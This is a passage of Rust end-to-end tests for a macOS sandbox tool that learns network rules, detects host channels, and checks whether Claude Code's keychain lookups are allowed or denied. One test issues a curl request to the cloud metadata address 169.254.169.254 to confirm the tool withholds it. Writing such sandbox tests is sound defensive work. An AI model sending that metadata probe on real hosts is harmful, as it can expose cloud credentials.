fn fw_e2e_085_discovery_of_hosts_and_channels() {
    let dir = Scratch::new("mac-085");
    if !seatbelt_host(dir.path()) || !on_path("curl") {
        not_exercised("Seatbelt or curl unavailable");
        return;
    }
    write_blueprint(
        dir.path(),
        "extends = [\"builtin:default\"]\nrules = [\"readwrite:$CWD/**\", \"allow:127.0.0.1:9\"]\n",
    );
    let learned = formwork(
        dir.path(),
        &[
            "learn",
            "--",
            "/bin/sh",
            "-c",
            "curl -sS -m 3 http://blocked.test/ >/dev/null; \
             curl -sS -m 3 http://169.254.169.254/latest >/dev/null; \
             printf x | pbcopy; true",
        ],
        &[],
    );
    assert_eq!(learned.code, 0, "{}", learned.stderr);
    assert!(
        learned
            .stderr
            .contains("withheld, not proposed (FW-DISC12)")
            && learned.stderr.contains("169.254.169.254"),
        "{}",
        learned.stderr
    );
    let list = formwork(dir.path(), &["learn", "--list"], &[]);
    assert!(
        list.stdout.contains("\"allow:blocked.test:80\""),
        "{}",
        list.stdout
    );
    assert!(list.stdout.contains("\"clipboard\""), "{}", list.stdout);
    assert!(!list.stdout.contains("169.254"), "{}", list.stdout);
    let accepted = formwork(dir.path(), &["learn", "--accept-all"], &[]);
    assert_eq!(accepted.code, 0, "{}", accepted.stderr);
    let channel = formwork(dir.path(), &["explain", "clipboard"], &[]);
    assert!(channel.stdout.contains("lifted"), "{}", channel.stdout);
}

/// FW-E2E-087 (macOS): `detect` reports the GUI login session the runner has, every channel's
/// facility present through it, and each channel line agrees with FW-E2E-081's observations.
#[test]
fn fw_e2e_087_host_session_detection() {
    let dir = Scratch::new("mac-087");
    if !seatbelt_host(dir.path()) {
        return;
    }
    write_blueprint(dir.path(), DEFAULT);
    let out = formwork(dir.path(), &["explain", "--json"], &[]);
    assert_eq!(out.code, 0, "{}", out.stderr);
    let v: serde_json::Value = serde_json::from_str(&out.stdout).unwrap();
    let gui = v["host"]["facilities"]["gui-session"].as_bool() == Some(true);
    let aqua = sh("launchctl managername");
    assert_eq!(
        gui,
        String::from_utf8_lossy(&aqua.stdout).trim() == "Aqua",
        "detect agrees with launchd about the GUI session: {}",
        v["host"]
    );
    for channel in ["clipboard", "screen", "run-outside"] {
        let presence = &v["report"]["channels"][channel]["host"];
        assert_eq!(
            presence["present"],
            gui || channel == "run-outside",
            "{channel}: {presence}"
        );
        assert_eq!(
            v["report"]["per-capability"][format!("channel-{channel}")]["status"],
            "enforced",
            "{channel}"
        );
    }
}

/// C9 (FEP-5 §6.3): Claude Code's keychain use on macOS, without a login. An unconfined control
/// run records what Claude Code does here: its output, and any `security` call through a shim first
/// in `PATH`. Under `claude-code.toml` -- the `claude` type lifts the keychain on macOS -- the
/// session behaves as the control did; under the same rules without the lift, the keychain lookup
/// is denied with a Sandbox record naming one of the keychain's services. Runs in the
/// `agent-examples` job, which installs the agents and sets `FW_AGENTS_INSTALLED=1`.
#[test]
fn c9_claude_code_keychain_use() {
    use std::os::unix::fs::PermissionsExt;
    const KEYCHAIN: [&str; 3] = [
        "com.apple.SecurityServer",
        "com.apple.securityd",
        "com.apple.securityd.xpc",
    ];
    let dir = Scratch::new("mac-c9");
    if !seatbelt_host(dir.path()) {
        return;
    }
    if !on_path("claude") {
        assert!(
            std::env::var("FW_AGENTS_INSTALLED").as_deref() != Ok("1"),
            "claude is not installed"
        );
        eprintln!("claude not installed; C9 runs in the agent-examples job");
        return;
    }
    let examples = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../examples/blueprints");
    for file in ["agent-base.toml", "claude-code.toml"] {
        std::fs::copy(examples.join(file), dir.path().join(file)).unwrap();
    }
    let base = std::fs::read_to_string(dir.path().join("claude-code.toml")).unwrap();
    assert!(base.contains("allow-credentials = [\"claude\"]"));
    std::fs::write(
        dir.path().join("no-keychain.toml"),
        base.replace("allow-credentials = [\"claude\"]", ""),
    )
    .unwrap();
    std::fs::create_dir_all(dir.path().join(".claude")).unwrap();
    let shim = dir.path().join("shim");
    std::fs::create_dir_all(&shim).unwrap();
    // The log lives where both blueprints let the session write (`agent-base.toml` grants the
    // temp directories, not the home directory).
    let log_dir = PathBuf::from(format!("/private/tmp/formwork-c9-{}", std::process::id()));
    std::fs::create_dir_all(&log_dir).unwrap();
    let calls = log_dir.join("security-calls");
    std::fs::write(
        shim.join("security"),
        format!(
            "#!/bin/sh\nprintf '%s\\n' \"$*\" >> '{}'\nexec /usr/bin/security \"$@\"\n",
            calls.display()
        ),
    )
    .unwrap();
    std::fs::set_permissions(
        shim.join("security"),
        std::fs::Permissions::from_mode(0o755),
    )
    .unwrap();
    let path = format!(
        "{}:{}",
        shim.display(),
        std::env::var("PATH").unwrap_or_default()
    );
    let asked = || {
        let got = std::fs::read_to_string(&calls).unwrap_or_default();
        let _ = std::fs::remove_file(&calls);
        got
    };
    let keychain_denials = |since: Instant| {
        sandbox_records(since, |m| {
            m.contains(" deny(")
                && KEYCHAIN
                    .iter()
                    .any(|s| m.contains(&format!("mach-lookup {s}")))
        })
    };

    // The control: Claude Code unconfined, in the same home and with the same PATH.
    let control = Command::new("claude")
        .args(["-p", "hi"])
        .current_dir(dir.path())
        .env("HOME", dir.path())
        .env("PATH", &path)
        .env_remove("ANTHROPIC_API_KEY")
        .stdin(std::process::Stdio::null())
        .output()
        .unwrap();
    let control_said = format!(
        "{}{}",
        String::from_utf8_lossy(&control.stdout),
        String::from_utf8_lossy(&control.stderr)
    );
    let control_asked = asked();
    eprintln!(
        "C9 control: exit {:?}\n{control_said}\nsecurity calls: {control_asked:?}",
        control.status.code()
    );
    assert!(control_said.contains("/login"), "{control_said}");

    let session = |blueprint: &str| {
        formwork_env(
            dir.path(),
            &["run", "--blueprint", blueprint, "--", "claude", "-p", "hi"],
            &[("PATH", path.as_str())],
            &["ANTHROPIC_API_KEY"],
        )
    };
    let lifted = session("claude-code.toml");
    let lifted_asked = asked();
    eprintln!(
        "C9 claude-code.toml: exit {}\n{}{}\nsecurity calls: {lifted_asked:?}",
        lifted.code, lifted.stdout, lifted.stderr
    );
    assert!(
        format!("{}{}", lifted.stdout, lifted.stderr).contains("/login"),
        "{}\n{}",
        lifted.stdout,
        lifted.stderr
    );
    // Claude Code issues its two lookups concurrently, so their order varies run to run.
    let sorted = |calls: &str| {
        let mut lines: Vec<String> = calls.lines().map(str::to_string).collect();
        lines.sort();
        lines
    };
    assert_eq!(
        sorted(&lifted_asked),
        sorted(&control_asked),
        "the session asked the keychain differently from the control"
    );

    // The same rules without the `claude` lift: the keychain is denied.
    let started = Instant::now();
    let unlifted = session("no-keychain.toml");
    let unlifted_asked = asked();
    let records = keychain_denials(started);
    eprintln!(
        "C9 without the lift: exit {}\n{}{}\nsecurity calls: {unlifted_asked:?}\nkeychain \
         records: {records:#?}",
        unlifted.code, unlifted.stdout, unlifted.stderr
    );
    let _ = std::fs::remove_dir_all(&log_dir);
    assert!(!records.is_empty(), "no Sandbox record for the keychain");
}
